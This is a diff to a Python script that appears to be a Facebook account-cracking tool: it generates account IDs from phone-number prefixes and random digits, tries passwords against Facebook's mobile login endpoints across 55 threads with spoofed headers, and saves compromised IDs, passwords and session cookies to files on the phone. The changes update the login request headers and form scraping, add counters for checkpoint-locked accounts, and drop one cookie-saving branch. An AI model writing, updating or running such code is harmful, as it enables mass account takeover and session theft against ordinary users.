@@ -1061,8 +1061,8 @@ def r_clone():
     
 def SUMON1():
     fresh()
-    print(f" {wow('â¢')} ENTER NUMBER WITH COUNTRY CODE ")
-    print(f" {wow('â¢')} EXAMPLE : {green}9351048348 ")
+    print(f" {wow('â¢')} ENTER FULL NUMBER  ")
+    print(f" {wow('â¢')} EXAMPLE : {green}8389066877 ")
     divider()
     number = input(f" {wow('-')} ENTER NUMBER : {green}")
     limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
@@ -1086,9 +1086,8 @@ def SUMON1():
     with tpe(max_workers=55) as Xnxx:
         fresh()
         tl = str(len(xnxx))
-        print(f" {wow('-')} TOTAL ACCOUNTS  : {green}{tl} ")
+        print(f" {wow('-')} TOTAL LIMID  : {green}{tl} ")
         print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
-        print(f" {wow('!')} {white}USE FLIGHT MODE FOR SPEED UP ")
         divider()
         for user in xnxx:
             uid = code+user
@@ -1102,16 +1101,16 @@ def SUMON2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (6377)')
+    print('[+] USE FOUR DIGIT   6377')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    kode = input('[+] INPUT CODE : ')
+    kode = input('[+] INTER CODE : ')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    limit = int(input('[+] LIMIT CLONE : '))
+    limit = int(input('[+] INTER LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
     clear()
-    print("                CHOOSE METHOD                       ")
+    print("                 METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (1) ")
     print(" [2] METHOD (2) ")
@@ -1122,7 +1121,7 @@ def SUMON2():
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
+    print(" [?] Show Cookies (Y/N) ")
     linex()
     c = input(" [?] INPUT : ")
     if c in ["Y", "y"]:
@@ -1133,9 +1132,9 @@ def SUMON2():
         clear()
         SUMON_time()
         tl = str(len(user))
-        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
-        print(f"[+] YOUR CODE CHOOSED : "+kode)
-        linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
+        print(f"[+] YOUR LIMIT : "+tl+" ")
+        print(f"[+] YOUR CODE  : "+kode)
+        linex();print(' USE (\033[1;32mAIRPLANE\033[1;32m) ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
@@ -1751,7 +1750,7 @@ def mbasic(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1--SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(M1--SUMON) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1813,11 +1812,6 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
-                    else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
@@ -1851,17 +1845,17 @@ def p(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M2--SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(M2--SUMON) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
-            data = {
-            'm_ts': '',
-            'li': '',
+            free_fb = Session.get('https://touch.facebook.com/').text
+            data =  {
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             'try_number': '0',
             'unrecognized_tries': '0',
             'email': uid,
@@ -1879,29 +1873,36 @@ def p(uid,pwx,tl):
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'dyn': '',
             'csr': '',
-            'req': '1',
+            'req': '3',
             'a': '',
             '__user': '0',
             '_fb_noscript': 'true'}
             headers = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'Host': 'm.facebook.com',
+            'content-length': '508',
+            'sec-ch-ua': '"Not.A/Brand";v="16", "Chromium";v="111", "Google Chrome";v="111"',
+            'sec-ch-ua-mobile': '?1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; STG S30 Build/PPR1.138256.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4919.90 Mobile Safari/537.36 UCBrowser/8.5.2.1937 (UCMini) Mobile',
+            'viewport-width': 'str(rr(400,989)',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': 'AVouTirHgPs',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'x-asbd-id': '129477',
+            'x-requested-with': 'mark.via.gp',
+            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="14.0.0.0", "Chromium";v="114.0.3782.22", "Google Chrome";v="111.0.5001.272"',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://m.facebook.com',
             'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=669323149842984&kid_directed_site=0&app_id=669323149842984&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%3D669323149842984%26redirect_uri%3Dhttps%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Ffacebook-login%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fwww.daraz.com.bd%252Ftag%252Fbn-vivo-smartphones%252F%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D26bbe34c-f341-4b73-aa3e-17f7c9fb4b73%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fwww.daraz.com.bd%252Ftag%252Fbn-vivo-smartphones%252F%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'zh-CN;q=0.8,zh;q=0.9',
+            'x-response-format': 'JSONStream'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1910,11 +1911,6 @@ def p(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
-                    else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
@@ -1928,8 +1924,7 @@ def p(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -1942,7 +1937,6 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 def x(uid,pwx,tl):
     global oks
@@ -2527,7 +2521,7 @@ def cracker(uid, pwx, tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            p_fb = Session.get("https://m.facebook.com").text
+            p_fb = Session.get("https://touch.facebook.com").text
             lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
             jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
             m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
